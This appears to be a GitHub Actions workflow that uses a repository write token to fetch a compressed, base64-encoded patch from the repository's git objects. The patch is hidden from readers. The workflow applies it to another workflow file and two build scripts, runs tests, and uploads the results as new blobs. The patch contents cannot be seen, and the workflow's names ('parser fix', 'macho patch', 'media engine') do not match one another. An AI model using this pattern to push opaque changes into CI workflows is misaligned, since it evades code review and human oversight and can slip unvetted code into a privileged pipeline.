name: Verify Deployment Parser Fix
on:
  push:
    branches: [pack/media-engine-20261028]
    paths: [.github/workflows/verify-macho-patch.yml]
permissions:
  contents: write
jobs:
  verify:
    runs-on: ubuntu-24.04
    timeout-minutes: 4
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
        with:
          ref: ef6dd48eed830d72d6864025bdae7de565e46536
          persist-credentials: false
      - name: Verify scoped patch, test it and store checked source objects
        env:
          GH_TOKEN: ${{ github.token }}
        shell: python
        run: |
          import base64, hashlib, json, lzma, os, pathlib, subprocess, urllib.request
          api='https://api.github.com/repos/osmankaankars/lemulip/git/'
          def call(route,payload=None):
              request=urllib.request.Request(api+route,data=None if payload is None else json.dumps(payload).encode(),headers={'Authorization':'Bearer '+os.environ['GH_TOKEN'],'Accept':'application/vnd.github+json','Content-Type':'application/json'})
              with urllib.request.urlopen(request,timeout=30) as response: return json.load(response)
          obj=call('blobs/a79a055fc77d81380d90c851db9dace68e84bf91')
          assert obj['encoding']=='base64'
          packed=base64.b64decode(obj['content'])
          assert len(packed)==2832 and hashlib.sha256(packed).hexdigest()=='69cad74e0e2066ee4728c853471d88bed5e6f6acd31af13fad82c26c7511d0a8'
          decoder=lzma.LZMADecompressor(memlimit=64*1024*1024)
          patch=decoder.decompress(packed,max_length=7550)
          assert decoder.eof and not decoder.unused_data and len(patch)==7549
          assert hashlib.sha256(patch).hexdigest()=='7bb90db65e8d414d2ede9f2354e1f7f643efb99595ba59d2cb769346d80f4202'
          paths={'.github/workflows/media-engine-pack.yml','script/bundle_engines.py','script/test_engine_packs.py'}
          stat=subprocess.check_output(['git','apply','--numstat'],input=patch).decode()
          assert {r.split('\t',2)[2] for r in stat.splitlines()}==paths
          subprocess.run(['git','apply','--check'],input=patch,check=True)
          subprocess.run(['git','apply'],input=patch,check=True)
          subprocess.run(['git','add','--',*sorted(paths)],check=True)
          assert subprocess.check_output(['git','write-tree'],text=True).strip()=='e3c58c4742ddfeb89290b3ba9610450630f66af0'
          for command in [['python3','script/test_build_media_engine.py'],['python3','script/test_engine_packs.py'],['python3','script/privacy_check.py','--staged'],['git','diff','--cached','--check']]:
              subprocess.run(command,check=True)
          entries=[]
          for path in sorted(paths):
              raw=pathlib.Path(path).read_bytes()
              sha=hashlib.sha1(b'blob '+str(len(raw)).encode()+b'\0'+raw).hexdigest()
              obj=call('blobs',{'encoding':'base64','content':base64.b64encode(raw).decode()})
              assert obj['sha']==sha
              entries.append({'path':path,'mode':'100644','type':'blob','sha':sha})
          print('VERIFIED_SOURCE_OBJECTS '+json.dumps(entries),flush=True)
